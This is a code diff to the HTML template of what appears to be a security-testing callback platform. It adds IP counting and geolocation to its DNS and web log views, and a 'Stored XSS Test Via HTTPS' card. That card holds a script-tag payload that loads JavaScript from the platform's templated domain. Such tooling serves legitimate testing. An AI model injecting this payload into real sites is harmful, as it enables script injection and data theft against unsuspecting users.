@@ -60,7 +60,8 @@
         </div>
         {% include 'auto_reload.html' %}
         </form>
-
+        <div id="ip_count" class="d-flex flex-wrap">
+        </div>
         <div data-example-id="hoverable-table">
             <table class="table table-hover">
               <thead>
@@ -68,8 +69,11 @@
                   <th>ID</th>
                   <th>{% translate '域名' %}</th>
                   <th>Type</th>
-                    <th>IP</th>
-                    <th>{% translate '位置' %}</th>
+                    <th>IP<button id="btnCountIPs" class="btn btn-sm btn-info py-0 ml-2" onclick="count_ips('dns')">Count</button></th>
+                    <th>{% translate '位置' %}
+                        <div class="spinner-grow spinner-grow-sm" role="status" id="spinner_location">
+                        </div>
+                    </th>
                   <th>{% translate '时间' %}</th>
                     <th style="width: 120px;">{% translate '操作' %}</th>
                 </tr>
@@ -77,7 +81,7 @@
               <tbody>
                 {% for log in logs %}
                 <tr>
-                <th scope="row">{{log.id}}</th>
+                <td scope="row">{{log.id}}</td>
                 <td style="word-break:break-all">{{ log.host }}</td>
                 <td>{{ log.type }}</td>
                     <td><a href="?ip={{ log.ip }}">{% if log.ip %} {{ log.ip }}</a> {% else %} &nbsp; {% endif %} </td>
@@ -106,14 +110,19 @@
             </div>
             {% include 'auto_reload.html' %}
         </form>
+        <div id="ip_count" class="d-flex flex-wrap">
+        </div>
         <div data-example-id="hoverable-table">
             <table class="table table-hover">
               <thead>
                 <tr>
                     <th>ID</th>
                     <th style="width: 350px;">URL</th>
-                    <th>IP</th>
-                    <th>{% translate '位置' %}</th>
+                    <th>IP<button id="btnCountIPs" class="btn btn-sm btn-info py-0 ml-2" onclick="count_ips('web')">Count</button></th>
+                    <th>{% translate '位置' %}
+                        <div class="spinner-grow spinner-grow-sm" role="status" id="spinner_location">
+                        </div>
+                    </th>
                     <th>{% translate '时间' %}</th>
                     <th style="width: 170px;">{% translate '操作' %}</th>
                 </tr>
@@ -121,7 +130,7 @@
               <tbody>
                 {% for log in logs %}
                 <tr>
-                <th scope="row">{{log.id}}</th>
+                <td scope="row">{{log.id}}</td>
                 <td> <span style="word-break:break-all">{{ log.path }} </span></td>
                 <td><a href="?ip={{ log.remote_addr }}">{% if log.remote_addr %} {{ log.remote_addr }}</a> {% else %} &nbsp; {% endif %}</td>
                     <td> {% if log.city %} {{ log.city }} {% else %} &nbsp; {% endif %} </td>
@@ -263,7 +272,21 @@
               <div class="card">
                   <div class="card-body">
                       <div class="card-header">
-                        一、命令执行场景
+                        Stored XSS Test Via HTTPS
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                            If you want to test XSS via https url to get rid of <b>Mixed Content Warnings (HTTPS/SSL)</b>
+                        </p>
+                        <p class="card-text">
+                          <mark>
+                              /&gt; &lt;script src=&quot;https://{{ xss_test_domain }}/x/?u={{ username }}&quot;&gt;&lt;/script&gt;&lt;
+                          </mark>
+                        </p>
+                          <p class="card-text"> Check javascript source code <a href="https://{{ xss_test_domain }}/x/?u={{ username }}">https://{{ xss_test_domain }}/x/?u={{ username }}</a></p>
+                      </div>
+                      <div class="card-header">
+                        命令执行场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -280,7 +303,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        二、SQL注入场景
+                        SQL注入场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -309,7 +332,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        三、XXE场景
+                        XXE场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -320,7 +343,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        四、其他场景
+                        其他场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -491,7 +514,57 @@
         $(function () {
             $('[data-toggle="popover"]').popover();
         })
+        $(document).ready(function() {
+            var loc = $(location).attr('pathname');
+            if (loc.endsWith('/web/')){
+                col_index = 2
+            }
+            if (loc.endsWith('/dns/')){
+                col_index = 3
+            }
+            var allIPs = new Set([]);
+            $('.table tr').each(function(index) {
+                if (index !== 0 && $(this).children('td')[col_index]){
+                    allIPs.add($(this).children('td')[col_index].innerText);
+                }
+            });
+            if (allIPs.size !== 0 ){
+                $.post("/ip2location", {"ips": Array.from(allIPs).join(',')}, function(result){
+                    var data = $.parseJSON(result);
+                    $('.table tr').each(function(index) {
+                        if (index !== 0 && $(this).children('td')[col_index]){
+                            let ip = $(this).children('td')[col_index].innerText;
+                            if (ip in data){
+                                $(this).children('td')[col_index+1].innerText = data[ip];
+                            }
+                        }
+                    });
+                    $('#spinner_location').hide()
+                });
+            } else {
+                $('#spinner_location').hide()
+            }
 
+        });
+
+        function count_ips(type){
+            $('#btnCountIPs').attr("disabled", true);
+            $.get("/ip_count/" + type, function(result){
+                $('#ip_count').html('');
+                for (let i = 0; i < result['data'].length - 1; i++) {
+                  html = `
+                  <a href="?ip=${result['data'][i]['ip']}" target="_blank">
+            <div class="card rounded-1 bg-light mr-4 my-1" style="width: 110px;" >
+                <div class="card-body p-0 justify-content-between d-flex">
+                    <span class="badge bg-light" >${result['data'][i]['ip']}</span> <span class="badge bg-warning float-end rounded-1">${result['data'][i]['total']}</span>
+                </div>
+            </div>
+              </a>`;
+                  $('#ip_count').append(html);
+                }
+                $('#btnCountIPs').attr("disabled", false);
+            });
+        }
 </script>
 
 </body>
